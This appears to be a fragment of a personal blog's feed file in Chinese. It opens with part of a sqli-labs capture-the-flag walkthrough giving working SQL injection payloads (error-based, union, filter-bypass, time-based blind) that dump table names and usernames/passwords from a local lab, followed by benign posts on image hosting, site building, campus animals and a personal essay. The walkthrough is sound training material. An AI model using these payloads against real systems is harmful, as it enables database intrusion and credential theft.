<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit num,1),0x23))--+</code>，其中num的数值从0开始逐一递增将所有表名回显。limit函数用于强制sql语句返回指定记录数，接受一个或两个整型参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，由于回显位限制，每次只能一行，因此通过改变第一个参数将表名遍历。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.5.png" alt="less-6.5"><br>(6)爆列名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit num,1),0x23))--+</code>，num从0开始逐一递增，users表的列名有id, usrname, password<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.6.png" alt="less-6.6"><br>(7)爆记录：构造URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+</code>，用户名回显后将username改为paswword<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.7.png" alt="less-6.7"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.8.png" alt="less-6.8"></p><p>Less-7~Less-9可以参考开头的链接</p><p>7、Less-11<br>POST表单提交，使用单引号闭合，和关卡12类似，在关卡12进行详细说明</p><p>8、Less-12<br>(1)为POST表单提交，在username中输入 <code>&#39; or 1=1 #</code>登陆失败，说明单引号’不作为闭合，则尝试使用双引号做闭合，依旧报错，再次尝试加上括号闭合。使用<code>&quot;) or 1=1 #</code>，”)闭合成功，同时注入 or 1&#x3D;1这个一定为真的条件，#注释后面的内容<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.1.png" alt="less-12.1"><br>(2)在username文本框输入：<code>&quot;) or 1=1 order by num #</code>，将num从2开始逐一增加，当num为3时报错，说明列数为2<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.2.png" alt="less-12.2"><br>(3)在username文本框中输入：<code>1&quot;) and 1=2 union select 1,2#</code>，有两个显示位，爆破数据库信息可以利用这两个显示位<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.3.png" alt="less-12.3"><br>(4)爆数据库信息和利用URL栏的GET方法是类似的，步骤同理关卡1。<br>   爆库：<code>1&quot;) and 1=2 union select 1,database()#</code><br>   爆表：<code>1&quot;) and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code><br>   爆列名：<code>1&quot;) and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #</code><br>   爆记录：<code>1&quot;) and 1=2 union select 1,2,group_concat(username,&quot;:&quot;,password) from users #</code></p><p>9、Less-13<br>类似关卡12，不同点在于使用<code>&#39;)</code>闭合</p><p>10、Less-14<br>类似关卡12，不同点在于使用<code>&quot;</code>闭合</p><p>11、Less-18<br>(1)为 POST 表单提交，在 username 中输入<code>&#39;or 1=1 #</code>和<code>&quot; or 1=1 #</code>等都显示登录失败，查看php文件，发现uname和passwd都做了check_input特殊处理<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.1.png" alt="less-18.1"><br>(2)check_input函数中，magic_quotes_gpc判断解析用户提示的数据，在magic_quotes_gpc &#x3D; On的情况下，如果输入的数据有单引号（’）、双引号（”）、反斜线（\）与 NULL等字符都会被加上反斜线。stripslashes()删除由 addslashes() 函数添加的反斜杠、ctype_digit()判断是不是数字，mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符，intval() 进行整型转换。这说明username和password都不能作为注入点。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.2.png" alt="less-18.2"><br>(3)用户名和密码输入admin，页面有user-agent的回显，猜测注入点在user-agent，使用单引号闭合。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.3.png" alt="less-18.3"><br>(4)爆库名：使用burpsuit抓包，将User-Agent改为SQL注入语句: <code>&#39;and extractvalue(1,concat(0x23,(select database()),0x23)) and &#39;</code>，通过报错注入将数据名回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.4.png" alt="less-18.4"><br>(5)爆表名：可以选择使用updatexml报错回显，payload为<code>1&#39;,1,updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)) #</code>，也可以使用extractvalue报错回显，payload为<code>&#39;and extractvalue(1,concat(0x23,( select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23)) and &#39;</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.5.png" alt="less-18.5"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.6.png" alt="less-18.6"><br>(6)爆列名：使用updatexml函数报错注入，payload为 <code>&#39;,updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;uagents&#39;),0x23),1)) #</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.7.png" alt="less-18.7"><br>(7)爆记录：使用updatexml报错注入，payload为：<code>&#39;,updatexml(1,concat(0x23,(select group_concat(username,&quot;:&quot;,password) from users),0x23),1)) #</code>，有长度限制所以只显示了部分，则也可以username和password分别使用<code>&#39;,updatexml(1,concat(0x23,(select username/password from users limit num,1),0x23),1)) #</code> （num从0开始逐一递增）将数据一个一个回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.8.png" alt="less-18.8"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.9.png" alt="less-18.9"></p><p>12、Less-19<br>和关卡18类似，注入点在referer</p><p>13、Less-20<br>和关卡18类似，注入点在cookie</p><p>14、Less-26<br>(1)根据提示输入<code>?id=1</code>，用户名和密码显示正常，添加单引号<code>&#39;</code>，提示语法错误，说明单引号被拼接到后台SQL查询语句，添加–+注释发现依旧报错，猜测对–+进行了过滤。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.1.png" alt="less-26.1"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.2.png" alt="less-26.2"><br>(2)使用<code>&#39;</code>闭合，对于注释&#x2F;结尾字符，用<code>;%00</code>作为结尾<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.3.png" alt="less-26.3"><br>(3)使用order by，页面报错显示or被过滤，使用双写、空格、注释等多次尝试，发现空格，or，and,&#x2F;*,#,–,&#x2F;等符号都被过滤。直接采用报错注入方式。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.4.png" alt="less-26.4"><br>(4)爆库名：构造payload为<code>?id=1&#39; aandnd(updatexml(1,concat(0x23,database(),0x23),1));%00</code>，使用双写避免and被过滤，windows上的apache对空格编码的转义有问题，需要使用()绕过空格<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.5.png" alt="less-26.5"><br>(5)爆表名：构造payload为：<code>?id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()))) ,1)  || &#39;1&#39;=&#39;1</code>，其中由于information存在or，需要双写。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.6.png" alt="less-26.6"><br>(6)爆列名：与爆表名类似，构造payload为：<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name=&#39;users&#39;))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.7.png" alt="less-26.7"><br>(7)爆记录：构造payload为将用户名和密码从users表中回显：<code>id=1&#39; || updatexml(1, concat(0x23, (select (group_concat(  concat_ws(0x7e,username, passwoorrd)  )) from (users))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.8.png" alt="less-26.8"><br>也可以使用<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd))) from (users) where(id=num))) ,1)  || &#39;1&#39;=&#39;1</code>，通过改变id的值单个记录显示<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.9.png" alt="less-26.9"><br>15、Less-64<br>(1)构造<code>id=1&#39;</code>，页面没有显示用户信息也没有SQL语句语法报错，则添加–+注释，对id&#x3D;1’、id&#x3D;1”、id&#x3D;1’)、id&#x3D;”)、id&#x3D;1))等依次尝试，当<code>id=))--+</code>时页面返回id&#x3D;1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.1.png" alt="less-64.1"><br>(2)构造<code>id=1)) order by num--+</code>，num从1开始递增，当num为3时页面正常，num为4时无显示，说明数据有3列<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.2.png" alt="less-64.2"><br>(3)使用联合查询找注入点，结果不可行<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.3.png" alt="less-64.3"><br>(4)使用时间注入方式判断，payload为<code>id=1)) and sleep(3)--+</code>，有延迟，进行时间注入<br>(5)数据库名长度：构造payload为<code>id=1)) and if(length(database())=8,1,sleep(2))--+</code>，页面返回正确且较快，当长度为7和9时都有延迟，说明数据库名长度为8<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.4.png" alt="less-64.4"><br>(6)构造payload：<code>id=1)) and if(left(database(),1)=&#39;s&#39; , sleep(3), 1) --+</code>，页面返回正确且较快，当为其他的字母时有延迟。通过改变<code>left(database(),num)</code>中num的大小以及匹配的字符，将数据库名得出<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.5.png" alt="less-64.5"><br>(7)由于手动一次次尝试较为麻烦，可以使用burpsuit进行爆破，url中payload为<code>id=1))and if(left(database(),1)=&#39;s&#39; , sleep(1), 1) --+</code>，使用burp抓包，将数据发送给intruder，清除原有变量，重新选定变量为第num个字符和字符，配置有效载荷进行爆破。但是由于Less-64只提供130次尝试，所以有限制。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.6.png" alt="less-64.6"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.7.png" alt="less-64.7"><br>(8)数据库名：构造payload：<code>id=1))and if(left(database(),8)=&#39;security&#39; , sleep(2), 1) --+</code>，页面返回正常且较快则说明数据库名为security<br>(9)爆表：构造payload：<code>id=1)) and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;,1,sleep(2))--+</code>，和数据库名的爆破相同，仅需修改substr的第二个参数值和设定的字符。<br>(10)爆列：构造payload为：<code>id =1)) and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;u&#39;,1,sleep(2))--+</code>，修改substr的第二个参数值和设定的字符。<br>(11)爆记录：构造payload为：<code>id=1))and if(substr((select username from security.users limit 0,1),1,1)=&#39;d&#39;,1,sleep(2))--+</code>，修改substr的第二个参数和设定的字符，密码爆破相同</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>学习站点推荐</title>
+      <link href="/knowledge/6.html"/>
+      <url>/knowledge/6.html</url>
+      
+        <content type="html"><![CDATA[<p>编程语言学习：<a href="https://www.runoob.com/">菜鸟教程</a>、<a href="https://www.w3school.com.cn/">w3school</a><br>论坛&#x2F;社区：<a href="https://blog.csdn.net/">CSDN</a>、<a href="https://www.cnblogs.com/">博客园</a>、<a href="https://www.jianshu.com/">简书</a>、<a href="https://www.freebuf.com/">Freebuf</a>、<a href="http://blog.nsfocus.net/">绿盟科技</a>、<a href="https://github.com/">Github</a>、<a href="https://juejin.cn/">掘金</a>、<a href="https://segmentfault.com/">思否</a>、<a href="https://bbs.pediy.com/">看雪论坛</a>、<a href="https://www.51cto.com/">51CTO</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> knowledge </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>搭建Github个人图床</title>
+      <link href="/technique/5.html"/>
+      <url>/technique/5.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>图床一般指储存图片的服务器，将图片上传至图床后可以直接通过外链访问，利用图床进行图片存储可以减轻网站服务器的压力、提供CDN加速等等。</p><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>目前的有许多图床平台供选择，比如<a href="https://cloud.tencent.com/">腾讯云COS</a>、Github图床、<a href="https://www.aliyun.com/product/oss/">阿里云OSS</a>、<a href="https://portal.qiniu.com/">七牛云图床</a>、<a href="https://sm.ms/">SM.MS图床</a>等，更多国内图床可以参考知乎链接：<a href="https://zhuanlan.zhihu.com/p/35270383">盘点国内免费好用的图床</a>。在对比不同图床的稳定性、容量、价格等因素后，选择了免费又可靠的Github图床。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>图床工具：PicGo  <a href="https://github.com/Molunerfinn/PicGo">下载地址</a><br>选择本地的图片上传工具可以方便我们快速上传图片并且获取图片外链，PicGo是较为推荐的工具，它提供剪切板图片上传、多种图片外链格式、支持多种图床……<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/PicGo.png" alt="PicGo"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>（1）Github配置</p><p>①登录<a href="https://github.com/">Github</a>，创建新的仓库，权限设置为public</p><p>②点击settings-&gt;Developer settings-&gt;Personal access tokens-&gt;tokens (classic)-&gt;Generate new token，选择repo权限后点击绿色的Generate token按钮，成功生成token，需要将其记录下来避免再次生成。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/token.png" alt="token"></p><p>（2）PicGo配置<br>点击PicGo中的Github图床配置，按照“账户名&#x2F;仓库名”的格式设置仓库名；分支名填写github仓库的默认分支（2020.10.01后，github的默认分支名由master变更为main，也可以选择其他分支，但是自定义域名格式处需要对应）；将Github配置图床时的token粘贴至设定token的文本框中；存储路径可选；为了使用CDN加快图片的访问速度，自定义域名格式为：<a href="https://cdn.jsdelivr.net/gh/GitHub%E7%94%A8%E6%88%B7%E5%90%8D/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93%E5%90%8D@main%EF%BC%9B%E7%82%B9%E5%87%BB%E7%A1%AE%E5%AE%9A%E3%80%82">https://cdn.jsdelivr.net/gh/GitHub用户名/图床仓库名@main；点击确定。</a><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/ImgHost/PicGo-settings.png" alt="PicGo配置"></p><h2 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h2><p>（1）使用PicGo上传图片至指定的Github图床仓库，如果要进行图片的删除，在PicGo中操作不会对Github中的图片进行删除。</p><p>（2）如果上传的图片过大或者因为服务器不稳定导致PicGo上传失败，可以直接进入Github的图床仓库上传图片，访问的外链则使用PicGo中的自定义域名加具体图片路径。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> image host </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>typecho建站Tips</title>
+      <link href="/technique/4.html"/>
+      <url>/technique/4.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="域名以及服务器"><a href="#域名以及服务器" class="headerlink" title="域名以及服务器"></a>域名以及服务器</h2><p>提供域名购买的网站有许多，包括阿里的<a href="https://wanwang.aliyun.com/">万网</a>、世界最大的域名注册商<a href="https://sg.godaddy.com/zh">Godaddy</a>、腾讯的<a href="https://dnspod.cloud.tencent.com/">腾讯云</a>、华为的<a href="https://www.huaweicloud.com/product/domain.html">华为云</a>等，域名注册的网站一般都提供首年特惠或者直接购买多年平均下来比续费划算的方案，不同的域名注册网站价格也稍有变化，国内的貌似更便宜些。</p><p>提供服务器购买的网站除了上面的阿里腾讯华为，还有<a href="https://www.youwebcloud.com/">优网</a>、<a href="http://www.zhujike.com/">主机壳</a>、<a href="https://cloud.baidu.com/">百度智能云</a>等，目前国内的两大巨头还是阿里云和腾讯云，都提供学生优惠，不过阿里率先进入这个行业，可能稳定性和安全性方面稍强（猜测？</p><p>在国内注册购买域名一般需要进行网站备案，腾讯、阿里、华为都提供较为便捷的备案流程，这里选择的是阿里的域名和它提供的学生优惠服务器。</p><p>（1）域名购买</p><p>购买域名步骤：</p><p>①实名认证<br>域名持有者信息需要与备案主体信息保持一致，包含姓名、证件类型、证件号码邮箱等等，其中邮箱需要进行真实性认证。</p><p>②查询想购买的域名后缀是否能备案<br>进入工信部网站的<a href="http://域名.信息/?spm=a2c4g.11186623.2.25.43314dc1O7oJzn#">中国互联网体系</a>查看工信部已经批复的域名后缀。</p><p>③域名购买<br>将域名加入清单进行结算，选择购买年限、选择域名持有者为个人并添加实名认证的个人信息模板，接着同意域名购买条款后购买。</p><p>（2）服务器购买<br>针对搭建个人小型网站的需求，轻量应用服务器就能满足。步骤如下：<br>①进行学生认证</p><p>②服务器地域节点选择<br>根据自己所在的地域选择服务器地域，目前大陆的服务器地域包含华北1（青岛）、华北2（北京）、华北3（张家口）、华北5（呼和浩特）、华东1（杭州）、华东2（上海）、华南1（深圳），选择一个较近的地域减小延时。</p><p>③镜像选择<br>阿里云轻量应用服务器提供应用镜像和系统镜像，系统镜像是单纯的Linux系统，而应用镜像则是部署了软件和环境的系统。对于不了解Linux系统操作或者希望一键使用的人可以直接选择相应的应用镜像，想自己配环境的则可以选择合适的系统镜像。</p><p>④绑定域名进行域名解析<br>为了成功进行备案，至少购买三个月的服务器。服务器购买成功后进入其管理页面，查看对应的公网IP。将购买的域名进行添加，按照提示进行A记录解析。</p><p>⑤服务器管理软件安装<br>如果选择的是系统镜像，为了方便可以下载提升运维效率的宝塔Linux面板，宝塔支持一键LAMP（Linux、Apache、Mysql、phpstudy）以及LNMP（Linux、Nginx、Mysql、phpstudy）等多项服务器管理功能。宝塔需要开放系统的8888端口，在安全组中的防火墙设置里添加规则将8888端口开放。</p><p>点击服务器的远程连接，在终端输入以下命令进行宝塔的安装：<br><code>wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</code><br>安装成功后会出现宝塔面板的访问网址以及用户名和密码，将网站复制粘贴至导航栏进行访问，输入对应的用户名和密码，即可进入宝塔界面。宝塔登陆后会自动跳出安装web环境的界面，根据个人需求选择，比如我选择的是LAMP，如果下载失败可以点击软件商店再次下载。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/BT-1.png" alt="宝塔界面"><br>初始的宝塔账户和密码不方便记忆，可以点击面板设置自定义。</p><h2 id="域名备案"><a href="#域名备案" class="headerlink" title="域名备案"></a>域名备案</h2><p>具体的备案流程见阿里云的<a href="https://help.aliyun.com/document_detail/61819.html?spm=a2c4g.11186623.3.2.56fc7bb3drkZ0l">ICP备案流程</a>，帮助文档比较详细。需要注意的是，在购买域名并进行实名认证后，为了确保实名认证信息入库管局，建议在实名认证完成后的三天再申请备案，否则可能存在管局审核检查不到最新域名实名认证信息，导致备案失败。</p><p>直接使用阿里的备案服务，在填写网站名称时可以根据网站名称指引进行填写，需要注意一些敏感词是不被允许的。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/step-1.png" alt="网站名称填写"><br>提交备案信息后阿里的工作人员会拨打电话进行备案信息的确认，如果网站名称不合适会进行告知并且帮助修改。</p><p>在阿里提交备案信息后工信部会发送短信进行认证，需要在收到信息后的24小时内登录<a href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.2.19.56d14b11fEgHLN#/Integrated/ComplaintA">工信部备案管理系统</a>进行验证。</p><p>由于阿里的备案流程界面短信校验进度不会及时更新，所以只要看到“尊敬的ICP用户：您的短信核验已全部完成，该请求将提交管局审核”就不必担心，耐心等待审核结果。</p><p>验证成功后将会提交至管局进行审核，审核成功后将会收到工业和信息化部发送的ICP备案号，至此备案成功。</p><h2 id="typecho模板使用"><a href="#typecho模板使用" class="headerlink" title="typecho模板使用"></a>typecho模板使用</h2><p>在宝塔界面点击网站添加站点，填写对应网站的信息，根目录默认为&#x2F;www&#x2F;wwwroot，添加成功后会创建相应域名的文件夹。安装typecho模板和主题的步骤如下：</p><p>①模板下载安装<br>进入tepecho官网<a href="http://typecho.org/download">下载页</a>，查看其正式版的环境需求（宝塔中安装的php版本需要满足在5.4以上），下载后进行解压，将文件放置在对应的域名文件夹下，如果还未备案成功需要通过IP访问进行typecho安装，备案成功后经域名解析通过IP和域名都可进行访问，按照页面提示创建账户进行模板安装。</p><p>②主题安装<br>提供typecho主题的站点：typecho官方主题站点<a href="https://typecho.me/">Typecho Themes</a>、<a href="https://www.npc.ink/tag/typecho-theme">Npcink</a>等，选择喜欢的主题下载后将文件夹放入&#x2F;usr&#x2F;themes目录下</p><p>③主题应用<br>访问自己的网站进入后台点击控制台选项中的外观，启用安装好的主题，本人主题使用说明<a href="https://zhebk.cn/Web/userAkina.html">Akina</a></p><h2 id="开启HTTPS"><a href="#开启HTTPS" class="headerlink" title="开启HTTPS"></a>开启HTTPS</h2><p>阿里目前提供免费的SSL证书服务，详情如下图<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/SSL.png" alt="阿里SSL"><br>证书部署步骤如下：</p><p>①认证<br>按照阿里提示的操作步骤，购买成功后提交证书申请材料并进行域名所有权认证，成功后证书签发。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/cert.png" alt="已签发"></p><p>②下载和配置<br>点击证书下载按钮，根据服务器类型下载对应证书。我的服务器为Apache，证书包含的文件如下<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/crt.png" alt="证书"><br>进入宝塔界面，点击个人网站中的设置，选项中存在SSL，点击其他证书，将下载的证书文件中的key文件粘贴至密钥key文本框，如果是Apache服务器的证书，将public.crt放在前面，chain.crt放在后面粘贴在证书PEM格式的文本框中，若是Nginx则按照PEM格式证书拼接的提示。粘贴完毕后点击保存按钮并开启窗口右上角的强制HTTPS，证书部署成功后显示绿色的文本框提示。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/BT-SSL.png" alt="BT-SSL"><br>进入typecho文件目录，编辑config.inc.php文件，添加如下代码：</p><pre><code>define(&#39;__TYPECHO_SECURE__&#39;, &#39;true&#39;);</code></pre><p>浏览器上进入网站后台，在设置-&gt;基本设置中的站点地址输入开启HTTPS后的URL链接</p><h2 id="配置伪静态"><a href="#配置伪静态" class="headerlink" title="配置伪静态"></a>配置伪静态</h2><p>（1）如果直接使用宝塔面板进行管理，则可以进入宝塔管理界面，点击网站-&gt;设置-&gt;伪静态，在“规则转换工具”左侧的下拉框中选择“wordpress”或者“typecho”进行保存（这里宝塔的版本不同会有差异）。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/construct/apache-config.png" alt="伪静态配置"></p><p>（2）如果不使用宝塔面板的伪静态配置，可以参考<a href="https://www.typechodev.com/servers/remove_index_for_apache.html">Apache伪静态</a>，但是需要注意apache配置文件所在的位置以及修改添加的代码中的个人网站目录</p><p>（3）进入网站后台，点击设置-&gt;永久链接，启用地址重写功能，出现错误后勾选仍然启用。</p><p>PS：由于是之前搭建的网站，有一些细节方面可能说的不太准确，欢迎指正(╹ڡ╹ )</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> website </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>江安动物园</title>
+      <link href="/life/2.html"/>
+      <url>/life/2.html</url>
+      
+        <content type="html"><![CDATA[<p>  相信大家都听说过“江安动物园”这个说法，今天小编带大家感受一下。</p><p><strong>可爱鸭鸭</strong></p><p>明远湖鸭鸭——游泳健将</p><p>在长桥经过的时候经常可以看见鸭鸭游得飞快（只能看见小水花），今天小编准备去采访它们，没想到鸭鸭整齐排着队等着我！<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/duck.png" alt="duck"></p><p>随处可见鸭鸭——富贵老板</p><p>在校园里同学们的电动车车头上站着黄色鸭鸭，墨镜+金链子一看就是富贵老板！但是，喂喂喂，为啥给老板墨镜戴反了！<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/boss.png" alt="boss1"></p><p><strong>慵懒猫猫</strong></p><p>液态猫猫——大鸡腿</p><p>江安的围合环境适合长猫猫，经常看到各位幸运人士炫耀长在宿舍床上的猫猫，小编很是羡慕，于是跑到草丛抓猫猫（不是<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/cat.png" alt="cat1"></p><p><strong>胖小啾啾</strong><br>江安的小麻雀经常在地面跳来跳去，于是从小路前往第一教学楼的路上经常可以看到肥硕的身影，走到它们跟前也不飞走，太美好了呜呜。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/animals/bird.png" alt="bird"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> life </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> zoo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>停止内耗</title>
+      <link href="/life/1.html"/>
+      <url>/life/1.html</url>
+      
+        <content type="html"><![CDATA[<p>  最近在微博看到一个词，叫做“自我内耗”。</p><p>  在传统的定义中，内耗（Internal friction）主要是从群体的角度出发，比如百度百科就将内耗效应定义为在群体心理学中，人们把社会或部门内部因不协调、或矛盾等造成的人力、物力等方面无谓的消耗而产生的负效应现象。另一种解释则更侧重个体，指一个人既不能够接纳现实因素，又难以做到坦然放下，从而陷入一种进退两难的境遇里。</p><p>  小马(weibo:<a href="https://weibo.com/tututu214">一匹英俊的小马</a>)把她的内耗描述为没有做什么但感觉很疲惫或者明明有事需要做但提不起精神的状态，最终只会导致脑子里一个劲胡思乱想但是实际上只在消耗情绪和精气神，任务进度条一点没涨。</p><p>  最近我好像也经常处于这个自我内耗的状态。大三的课表较前两学年来说空了不少，但是这学期总感觉更累了。每次形教课的话题总是谈到考研、保研、工作等这些需要尽快确定的决定，同学之间在学科竞赛、科研论文等活动不断推进，一下子突然被push甚至来不及从适应期过渡。虽然说这些努力和决定都是自己的选择、和自己未来相关的事情，但是可能依旧不够成熟不能自己担起责任，总是想着顺其自然暂且这样过着。心里当然还是会有不甘，在颓废和上进里来回横跳，于是桌上摆笔记本手里拿手机刷来刷去这个怪诞的操作对我来说总是很熟练。等玩耍一番后又立马进入贤者模式，开始懊悔浪费了时间愧对自己愧对家人。这样反复的情绪变化最后带来的却主要是疲惫的心理，在教室坐下自习只会带着一脑子的混乱思想，效率低到难以置信。</p><p>  那些有目标并且为之奋斗，有一步一步规划并且日复一日坚持的人在我身边也很常见，我很佩服他们也想成为他们。当我赖在床上睡大觉的时候，当我抱着零食笔记本屏幕播着视频的时候，当我完成作业万事大吉专业学习丢一边的时候，他们在图书馆和教学楼自习，在参加比赛做实验写论文，在考驾照考雅思托福，看live演出跑步健身……并不是说因为没有花大量时间学习让我感到焦虑落后，而是不能将娱乐和学习平衡好，并且没有自我能力的提升长期处于干皱皱的海绵状态。日常几乎只有按部就班的上课、完成作业和娱乐活动，没有看课外书没有自主学习，连计划的每日背单词阅读英语文章实际上坚持一两天就搁浅了。虽然以肥宅标榜自己，将肥宅生活作为今后美好追求，但是还没有可以支持这种生活的基础（泪目，所以还是需要现阶段转换状态。</p><hr><p>  “脑子腾空做事；还没有发生的，不用去猜。”  希望我们都能停止内耗。<br> <img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/%E7%8B%97%E5%8B%BE.jpg" alt="dog"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> life </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> thinking </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+    
+    
+    <entry>
+      <title>links</title>
+      <link href="/links/index.html"/>
+      <url>/links/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于我</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
